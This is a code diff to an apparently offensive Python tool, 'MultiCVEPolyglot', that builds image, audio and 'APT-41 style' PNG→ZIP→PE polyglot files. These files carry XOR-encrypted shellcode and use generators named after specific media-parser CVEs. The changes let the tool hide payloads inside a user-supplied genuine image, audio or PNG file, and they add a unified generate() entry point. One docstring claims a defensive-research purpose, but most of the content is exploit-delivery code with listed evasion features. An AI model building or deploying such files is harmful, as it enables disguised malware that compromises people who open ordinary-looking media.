@@ -11,6 +11,7 @@ Author: SWORDIntel
 Date: 2025-11-10
 """
 
+import os
 import sys
 import struct
 import argparse
@@ -91,18 +92,23 @@ class MultiCVEPolyglot:
 
         return bytes(encrypted)
 
-    def create_image_polyglot(self, shellcode, output_path):
+    def create_image_polyglot(self, shellcode, output_path, custom_container_path=None):
         """
         Create image polyglot: GIF + PNG + JPEG + WebP + TIFF + BMP
 
         Structure:
-        - GIF header (most permissive)
+        - GIF header (most permissive format) OR custom image file
         - PNG chunks (embedded)
         - JPEG markers (embedded)
         - WebP RIFF container
         - TIFF IFD
         - BMP header
         - XOR-encrypted payload
+
+        Args:
+            shellcode: Shellcode payload
+            output_path: Output file path
+            custom_container_path: Optional path to custom base image file
         """
         if self.tui:
             self.tui.section("Creating Image Polyglot")
@@ -110,10 +116,18 @@ class MultiCVEPolyglot:
         else:
             print("[*] Creating image polyglot (6 formats)...")
 
-        # Start with GIF (most permissive format)
-        if self.tui:
-            self.tui.info("Adding GIF base layer...")
-        polyglot = self.generator._cve_2019_15133_giflib(shellcode)
+        # Start with custom image if provided, otherwise generate GIF
+        if custom_container_path and os.path.isfile(custom_container_path):
+            if self.tui:
+                self.tui.info(f"Using custom base image: {os.path.basename(custom_container_path)}")
+            with open(custom_container_path, 'rb') as f:
+                polyglot = f.read()
+            # Add alignment padding
+            polyglot += b'\x00' * 16
+        else:
+            if self.tui:
+                self.tui.info("Adding GIF base layer...")
+            polyglot = self.generator._cve_2019_15133_giflib(shellcode)
 
         # Add padding for alignment
         polyglot += b'\x00' * 16
@@ -160,16 +174,21 @@ class MultiCVEPolyglot:
             print(f"    Formats: GIF, PNG, JPEG, WebP, TIFF, BMP")
         return output_path
 
-    def create_audio_polyglot(self, shellcode, output_path):
+    def create_audio_polyglot(self, shellcode, output_path, custom_container_path=None):
         """
         Create audio polyglot: MP3 + FLAC + OGG + WAV
 
         Structure:
-        - MP3 with ID3v2 tag
+        - MP3 with ID3v2 tag OR custom audio file
         - FLAC metadata
         - OGG pages
         - WAV RIFF container
         - XOR-encrypted payload
+
+        Args:
+            shellcode: Shellcode payload
+            output_path: Output file path
+            custom_container_path: Optional path to custom base audio file
         """
         if self.tui:
             self.tui.section("Creating Audio Polyglot")
@@ -177,10 +196,18 @@ class MultiCVEPolyglot:
         else:
             print("[*] Creating audio polyglot (4 formats)...")
 
-        # Start with MP3 (Frankenstein stream)
-        if self.tui:
-            self.tui.info("Adding MP3 base layer (CVE-2024-10573)...")
-        polyglot = self.generator._cve_2024_10573_mpg123(shellcode)
+        # Start with custom audio if provided, otherwise generate MP3
+        if custom_container_path and os.path.isfile(custom_container_path):
+            if self.tui:
+                self.tui.info(f"Using custom base audio: {os.path.basename(custom_container_path)}")
+            with open(custom_container_path, 'rb') as f:
+                polyglot = f.read()
+            # Add alignment padding
+            polyglot += b'\x00' * 32
+        else:
+            if self.tui:
+                self.tui.info("Adding MP3 base layer (CVE-2024-10573)...")
+            polyglot = self.generator._cve_2024_10573_mpg123(shellcode)
 
         # Add padding
         polyglot += b'\x00' * 32
@@ -227,14 +254,14 @@ class MultiCVEPolyglot:
             print(f"    Formats: MP3, FLAC, OGG, WAV")
         return output_path
 
-    def create_mega_polyglot(self, shellcode, output_path):
+    def create_mega_polyglot(self, shellcode, output_path, custom_container_path=None):
         """
         Create mega polyglot: Image + Audio + Video formats
 
         The ultimate polyglot combining as many formats as possible.
 
         Structure:
-        - GIF header (base)
+        - GIF header (base) OR custom base file
         - JPEG markers
         - PNG chunks
         - WebP data
@@ -242,12 +269,28 @@ class MultiCVEPolyglot:
         - FLAC metadata
         - MP4 boxes
         - XOR-encrypted payload
+
+        Args:
+            shellcode: Shellcode payload
+            output_path: Output file path
+            custom_container_path: Optional path to custom base file (any format)
         """
         if self.tui:
             self.tui.section("Creating MEGA Polyglot")
             self.tui.critical("MAXIMUM COMPLEXITY: Combining 12+ formats!")
         else:
             print("[*] Creating MEGA polyglot (12+ formats)...")
+
+        # Start with custom file if provided, otherwise build from scratch
+        if custom_container_path and os.path.isfile(custom_container_path):
+            if self.tui:
+                self.tui.info(f"Using custom base file: {os.path.basename(custom_container_path)}")
+            with open(custom_container_path, 'rb') as f:
+                polyglot = f.read()
+            # Add alignment padding
+            polyglot += b'\x00' * 64
+        else:
+            polyglot = b''
 
         formats_to_add = [
             ("GIF", "CVE-2019-15133", lambda: self.generator._cve_2019_15133_giflib(shellcode), 16),
@@ -261,7 +304,6 @@ class MultiCVEPolyglot:
             ("MP4", "CVE-2022-22675", lambda: self.generator._cve_2022_22675_appleavd(shellcode), 64),
         ]
 
-        polyglot = b''
         total_formats = len(formats_to_add)
 
         for i, (fmt, cve, generator_func, padding) in enumerate(formats_to_add, 1):
@@ -560,7 +602,7 @@ class MultiCVEPolyglot:
 
         return container
 
-    def create_apt41_cascading_polyglot(self, shellcode, output_path):
+    def create_apt41_cascading_polyglot(self, shellcode, output_path, custom_png_path=None):
         """
         Create APT-41 style cascading polyglot: PNG→ZIP→5×PE executables
 
@@ -586,6 +628,11 @@ class MultiCVEPolyglot:
         - Steganography (valid PNG container)
 
         For defensive research and detection development only.
+
+        Args:
+            shellcode: Shellcode payload for PE executables
+            output_path: Output file path
+            custom_png_path: Optional path to custom PNG to use as container
         """
         if self.tui:
             self.tui.section("Creating APT-41 Cascading Polyglot")
@@ -599,31 +646,46 @@ class MultiCVEPolyglot:
         if self.tui:
             self.tui.info("Layer 1: Creating PNG steganography container...")
 
-        # Valid PNG header
-        png = b'\x89PNG\r\n\x1a\n'
+        # Use custom PNG if provided, otherwise create minimal PNG
+        if custom_png_path and os.path.isfile(custom_png_path):
+            if self.tui:
+                self.tui.info(f"  Using custom PNG: {os.path.basename(custom_png_path)}")
 
-        # IHDR chunk (64x64 image)
-        ihdr_data = struct.pack('>IIBBBBB', 64, 64, 8, 2, 0, 0, 0)
-        ihdr_crc = 0  # Simplified (not calculated)
-        png += struct.pack('>I', len(ihdr_data))  # Chunk length
-        png += b'IHDR'
-        png += ihdr_data
-        png += struct.pack('>I', ihdr_crc)
+            with open(custom_png_path, 'rb') as f:
+                png = f.read()
 
-        # IDAT chunk (minimal image data)
-        idat_data = b'\x00' * 256  # Placeholder image data
-        png += struct.pack('>I', len(idat_data))
-        png += b'IDAT'
-        png += idat_data
-        png += struct.pack('>I', 0)  # CRC
+            # Ensure PNG is at least 0x1000 bytes for ZIP offset
+            if len(png) < 0x1000:
+                png += b'\x00' * (0x1000 - len(png))
+        else:
+            if self.tui:
+                self.tui.info("  Using default minimal PNG (64x64)")
 
-        # IEND chunk
-        png += struct.pack('>I', 0)
-        png += b'IEND'
-        png += struct.pack('>I', 0)
+            # Valid PNG header
+            png = b'\x89PNG\r\n\x1a\n'
 
-        # Pad to offset 0x1000 (where ZIP archive starts)
-        png += b'\x00' * (0x1000 - len(png))
+            # IHDR chunk (64x64 image)
+            ihdr_data = struct.pack('>IIBBBBB', 64, 64, 8, 2, 0, 0, 0)
+            ihdr_crc = 0  # Simplified (not calculated)
+            png += struct.pack('>I', len(ihdr_data))  # Chunk length
+            png += b'IHDR'
+            png += ihdr_data
+            png += struct.pack('>I', ihdr_crc)
+
+            # IDAT chunk (minimal image data)
+            idat_data = b'\x00' * 256  # Placeholder image data
+            png += struct.pack('>I', len(idat_data))
+            png += b'IDAT'
+            png += idat_data
+            png += struct.pack('>I', 0)  # CRC
+
+            # IEND chunk
+            png += struct.pack('>I', 0)
+            png += b'IEND'
+            png += struct.pack('>I', 0)
+
+            # Pad to offset 0x1000 (where ZIP archive starts)
+            png += b'\x00' * (0x1000 - len(png))
 
         if self.tui:
             self.tui.success(f"  PNG container: {len(png):,} bytes", prefix="  ")
@@ -769,6 +831,36 @@ class MultiCVEPolyglot:
             print(f"    Defense evasion: Corrupted headers, anti-VM, matryoshka nesting")
 
         return output_path
+
+    def generate(self, polyglot_type, output_path, cve_list=None, custom_container_path=None):
+        """
+        Unified wrapper method for generating polyglots
+
+        Args:
+            polyglot_type: Type of polyglot ('image', 'audio', 'mega', 'apt41', 'custom')
+            output_path: Output file path
+            cve_list: Optional list of CVEs (for custom polyglot)
+            custom_container_path: Optional custom container file path
+
+        Returns:
+            str: Path to generated polyglot file
+        """
+        # Generate default shellcode
+        shellcode = self.generator.generate_shellcode('poc_marker')
+
+        # Route to appropriate method based on type
+        if polyglot_type == 'image':
+            return self.create_image_polyglot(shellcode, output_path, custom_container_path)
+        elif polyglot_type == 'audio':
+            return self.create_audio_polyglot(shellcode, output_path, custom_container_path)
+        elif polyglot_type == 'mega':
+            return self.create_mega_polyglot(shellcode, output_path, custom_container_path)
+        elif polyglot_type == 'apt41':
+            return self.create_apt41_cascading_polyglot(shellcode, output_path, custom_container_path)
+        elif polyglot_type == 'custom' and cve_list:
+            return self.create_custom_polyglot(cve_list, shellcode, output_path)
+        else:
+            raise ValueError(f"Unknown polyglot type: {polyglot_type}")
 
     def list_presets(self):
         """List available polyglot presets"""
